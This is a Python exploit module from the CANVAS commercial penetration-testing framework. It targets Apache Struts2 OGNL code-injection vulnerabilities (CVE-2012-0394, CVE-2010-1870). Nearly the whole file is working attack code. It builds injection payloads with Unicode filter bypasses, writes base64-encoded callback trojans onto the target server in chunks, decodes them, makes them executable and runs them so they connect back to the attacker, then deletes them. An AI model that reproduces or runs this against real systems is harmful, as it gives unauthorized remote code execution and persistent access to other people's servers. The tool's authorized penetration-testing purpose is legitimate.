# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2012
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
import traceback

if "." not in sys.path: sys.path.append(".")

import os
import base64
import urllib
import urllib2
import canvasengine

from tcpexploit import tcpexploit
from libs.canvasos import *
from libs import spkproxy
from exploitutils import standard_callback_commandline

NAME                                        = "Struts Code Injector"
DESCRIPTION                                 = "Multiple critical vulnerabilities in Apache Struts2"
VERSION                                     = "1.0"
NOTES                                       = """Notes"""
GTK2_DIALOG                                 = "dialog.glade2"
DOCUMENTATION                               = {}
DOCUMENTATION["Notes"]                      = """
CVE-2012-0394
- Struts <= 2.2.1.1 (ExceptionDelegator)

When an exception occurs while applying parameter values to properties, the
value is evaluated as OGNL expression which can be abused to accomplish Java code execution.

- Struts <= 2.3.1 (CookieInterceptor)

Again an OGNL expression can be abused to accomplish arbitrary Java code execution
by means of a crafted cookie.

CVE-2010-1870
- Struts <= 2.2.0 (Xworks filter bypass)
Unicode characters can be used to bypass character restrictions on OGNL expressions.

"""
DOCUMENTATION['VENDOR']                     = "Apache"
DOCUMENTATION["Repeatability"]              = "Infinite"
DOCUMENTATION['CVE Name']                   = 'CVE-2012-0394'
DOCUMENTATION['CVE Url']                    = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-0394'
DOCUMENTATION["References"]                 = """
CVE-2012-0394
http://struts.apache.org/2.x/docs/s2-008.html
https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt

CVE-2010-1870
http://seclists.org/fulldisclosure/2010/Jul/183
http://struts.apache.org/2.2.1/docs/s2-005.html
"""
DOCUMENTATION['Compatibility']              = """
Struts <= 2.2.1.1 (ExceptionDelegator)
Struts <= 2.3.1 (CookieInterceptor)
Struts <= 2.2.0 (XworksFilterBypass)
"""
PROPERTY                                    = {}
PROPERTY['TYPE']                            = "Web Exploits"
PROPERTY['SITE']                            = "Remote"
PROPERTY['ARCH']                            = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']                         = [ "<=2.2.0" ,"<=2.2.1.1", "<=2.3.1" ]

TIMEOUT = 10

# TODO: Add DNS and HTTP callback support
# TODO: Spike proxy authentication support
# TODO: Blind exploitability verification (Java 'sleep' equivalent?)
# TODO: Strict error checking in the exploit steps (now they always return true)
# TODO: Auto version selection

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ''
        self.port               = 80
        self.path               = ""
        self.ssl                = False
        self.base_url           = ""
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.http_ssl           = False
        self.username           = ""
        self.password           = ""
        self.trigger_url        = ""
        self.payload_type       = "ExceptionDelegator".upper() # ExceptionDelegator,CookieInterceptor,XWork
        self.parameter          = ""
        self.debug              = 0

        self.setInfo(DESCRIPTION)


    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """

        self.getarg("host")
        self.getarg("port")
        self.getarg("path")
        self.getarg("parameter")
        self.getarg("username")
        self.getarg("password")
        self.getarg("ssl")

        if self.path == "/":
            self.path = ""

        if self.ssl:
            self.base_url = "https://"
        else:
            self.base_url = "http://"

        self.base_url      = self.base_url + self.host + ':' + str(self.port) + self.path
        self.mosdef_type   = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.payload_type  = self.argsDict.get("radio_payload_value", self.payload_type).upper().strip()


    def verify(self):
        """Primitive to verify if the target is exploitable. Returns true or false."""
        return True

    def format_payload(self, payload):
        """
        Replace '#' and '=' for their unicode equivalents to bypass filtering.
        Also Remove any line separator from the payload.
        """
        payload = payload.replace("#", "\\u0023")
        payload = payload.replace("=", "\\u003d")
        return payload.replace("\n","").replace("\r","")

    def upload_payload(self, filename, data, append=True):
        if append:
            payload = """
#filepath = new java.io.File(@org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),"%s").getPath(),
new java.io.BufferedWriter(new java.io.FileWriter(#filepath,true)).append("%s").close()
""" % (filename,data)

        else:
            payload = """
#filepath = new java.io.File(@org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),"%s").getPath(),
new java.io.BufferedWriter(new java.io.FileWriter(#filepath,false)).append("").close()
""" % filename

        return payload

    def upload(self, filename, data, rate=150):
        self.log("Uploading '%s'" % filename)
        length = len(data)

        # blank file
        self.payload = self.upload_payload(filename, "",False)
        self.deploy()

        for i in xrange(0,length,rate):
            count = rate
            if (i + rate) > length:
                count = length
            else:
                count = i + rate

            #print "i: %s, count:%s, Len: %s, rate: %s" % (i, count,length, rate)
            cur_data = "".join(data[i:count])
            #print "Data: %s" % cur_data

            self.payload = self.upload_payload(filename, cur_data)
            #print self.payload
            self.deploy()

        self.log("'%s' upload finished." % filename)
        return True

    def exception_payload(self):
        return urllib.urlencode({ self.parameter : "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,%s)+'" % self.format_payload(self.payload) })

    def cookie_payload(self):
        return urllib.urlencode({ 'Cookie' : "#_memberAccess[\"allowStaticMethodAccess\"]\\u003dtrue)(x)=1; x[(%s)]=1" % self.format_payload(self.payload)  })

    def xwork_payload(self):
        payload = """('
#_memberAccess[\"allowStaticMethodAccess\"] = true,
#context['xwork.MethodAccessor.denyMethodExecution'] = new java.lang.Boolean("false"),
%s')""" % self.format_payload(self.payload)
        return urllib.quote_plus(self.format_payload(payload))

    def decode(self, filename):
        """ Primitive for decoding a file on the server that was uploaded as a base64 string."""
        payload = """
#filepath = new java.io.File(@org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),"%s").getPath(),
#size = new java.io.File(#filepath).length(),
#data = new byte[#size],
#reader = new java.io.BufferedInputStream(new java.io.FileInputStream(#filepath)),
#reader.read(#data, 0, #size),
#reader.close(),
#fstream = new java.io.FileOutputStream(#filepath,false),
#fstream.write(new sun.misc.BASE64Decoder().decodeBuffer(new java.lang.String(#data))),
#fstream.close()
""" % filename

        self.payload = payload
        self.deploy()

        self.log("'%s' decoded and ready to run." % filename)

    def unzip(self):
        # DEPRECATED
        # Primitive to unzip the zip file containing the callbacks that were sent to the server
        # it didn't work to well so now the callbacks are transmitted individually without being
        # zipped. It might be useful to have it around...
        # The problem with it it's that it's really tricky to read a zipfile entry without using
        # a loop.
        callbacks = ["mosdef_callback_linux_i386","mosdef_callback_linux_mipsel","mosdef_callback_universal_win32.exe","mosdef_callback_universal_win64.exe"]

        cur_callback = callbacks[0]
        payload = """
#path = @org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),
#filepath = new java.io.File(#path,"%s").getPath(),
#zipfile = new java.util.zip.ZipFile(#filepath),
#entry = #zipfile.getEntry("%s"),
#entrypath = new java.io.File(#path,"%s").getPath(),
#stream = #zipfile.getInputStream(#entry),
#fstream = new java.io.FileOutputStream(#entrypath,false),
#fstream.write(#stream),
#fstream.close(),
#zipfile.close()
""" % (self.filename,cur_callback,cur_callback)

        if self.debug:
            payload += ",%s" % self.dbg_str(var="#entry")

        self.payload = payload
        self.deploy()

    def get_zipped_callbacks(self):
        with open("callbacks.zip") as f:
            return base64.encodestring(f.read()).replace('\n','')

    def upload_callbacks(self):
        """Upload each callback to the server."""

        platforms = ("linux", "windows") if self.mosdef_type != "DNS" else ("windows",)

        for p in platforms:
            for a in ("X86", "X64"):
                callback_filename = "callback_%s_%s.exe" % (p, a)
                callback_path = os.path.join(self.tmppath, callback_filename)

                with open(callback_path) as f:
                    self.upload(callback_filename, base64.encodestring(f.read()).replace('\n','') )
                    self.decode(callback_filename)

    def run_callback(self):
        """Primitive for running the correct callback depending of the server's os and architecture."""

        self.log("Running callback.")
        payload = """
#path = @org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),
#osName = @java.lang.System@getProperty("os.name").toLowerCase().split(" ")[0],
#osArch = @java.lang.System@getProperty("os.arch"),
#callback_filename = (#osArch.indexOf("64") != -1)? ("callback_" + #osName + "_X64.exe") : ("callback_" + #osName + "_X86.exe"),
#callback_path = new java.io.File(#path,#callback_filename).getPath(),
#cmd_string = "chmod +x " + #callback_path,
#rt = @java.lang.Runtime@getRuntime(),
#p = (#osName.equals("linux"))? #rt.exec(#cmd_string) : "",
#rt.exec(#callback_path)
"""
        payload += ",%s" % self.dbg_str(var="#cmd_string")

        self.payload = payload
        self.deploy()

    def cleanup(self):
        """Primitive for deleting the callbacks from the server."""
        payload = """
#path = @org.apache.struts2.ServletActionContext@getServletContext().getRealPath("/"),
#cmd_string = "rm " + new java.io.File(#path,"callback").getPath() + "* ",
#p = @java.lang.Runtime@getRuntime().exec(#cmd_string)
"""
        self.payload = payload
        try:
            self.deploy()
        except Exception, ex:
            self.log('Error during remote cleanup: %s' % str(ex))

        self.log("Cleaning local temp files...")
        delete_files = []

        for p in ("linux", "windows"):
            for a in ("X86", "X64"):
                delete_files.append(os.path.join(self.tmppath, "callback_%s_%s.exe") % (p, a))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def deploy(self):
        """ Send the crafted request to the server """
        data = None

        self.trigger_url = self.base_url

        if self.payload_type == "CookieInterceptor".upper(): # Struts <= 2.3.1
            deploy_url = self.trigger_url
            data = self.cookie_payload()

        elif self.payload_type == "XworksFilterBypass".upper(): # Struts <= 2.2.0
            deploy_url = self.trigger_url + '?' + self.xwork_payload()

        else: # "ExceptionDelegator" Struts <= 2.2.1.1
            deploy_url = self.trigger_url + '?' + self.exception_payload()

        ua = self.setup_UA(url=deploy_url)
        if data:
            #post_data = urllib.urlencode(data)
            #req = urllib2.Request(url,post_data)
            response = ua.POST(args="", data=data)
        else:
            #req = urllib2.Request(url)
            #response = urllib2.urlopen(req)
            response, response_code = ua.GET("", return_response_code=True)

            #self.log("%s returned code %d" % (deploy_url, response_code))

    def dbg_str(self,msg=None, var=None):
        """
        =FOR INTERNAL USE ONLY=
        Used to have some limited debug capability when working with this exploit.

        Example:
        ...
        payload = "SOME OGNL PAYLOAD"

        if self.debug:
            payload += ",%s" % self.dbg_str(var="#some_variable")
        ...


        This will add the string below to the payload which will then try to write the value
        of '#some_variable' to '/tmp/log' . If nothing gets written on the log then there is
        something in the payload that is failing.
        """
        if not msg:
            msg = var
        else:
            msg = "\"%s\"" % msg

        return "new java.io.BufferedWriter(new java.io.FileWriter(\"/tmp/log\",true)).append(%s + '\\n').close()" % msg


    def setup_UA(self, url=""):
        """
        Setup everything needed to do requests using spkproxy
        """
        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.username and self.password:
            auth = spkproxy.BasicAuth(self.username, self.password)
            self.log("Using BasicAuth (User: %s - Password: %s)" % (self.username, self.password))
        else:
            auth = None

        ua  = spkproxy.UserAgent(url, auth=auth, hostname=self.host, exploit=self)
        return ua

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log("Attacking %s:%d - base url: %s" % (self.host, self.port, self.base_url))

        self.tmppath = self.engine.create_new_session_output_dir(self.host, 'temp_files')

        if not self.verify:
            self.setInfo("'%s:%d' Target NOT exploitable." % (self.host, self.port))
            return 0

        if not self.build_universal_trojans():
            self.log("Error while build callbacks, aborting..")
            return 0

        try:
            self.upload_callbacks()
        except Exception:
            self.log('Could not upload callbacks, aborting..')
            return 0

        try:
            self.run_callback()
        except Exception:
            self.log('Could not run callback, aborting..')
            return 0

        self.cleanup()

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - base url: %s - done (success!)" % (NAME, self.host, self.port, self.base_url))
            return 1

        self.setInfo("%s attacking %s:%d - base url: %s - done (failed)" % (NAME, self.host, self.port, self.base_url))
        return 0

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        self.log("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback.ip), str(self.callback.port)))
        for platform in ("Windows", "Linux"):
            t_os = canvasos(platform)

            for arch in ("X86", "X64"):
                t_os.arch = arch
                # nasty way of creating an x64 binary for linux... x64 is still not supported
                if platform == "Linux" and arch == "X64":
                    t_os.arch = "X86"
                try:
                    ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                        target_os=t_os, universal=True,
                        http=http, ssl=ssl)
                    if ret:
                        filename = os.path.join(self.tmppath, "callback_%s_%s.exe" % (platform.lower(), arch))
                        with open(filename,"wb") as f:
                            f.write(self.mosdeftrojan)
                except Exception, err:
                    self.log("Problem building MOSDEF trojan: %s" % str(err))
                    res = False
        return res

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
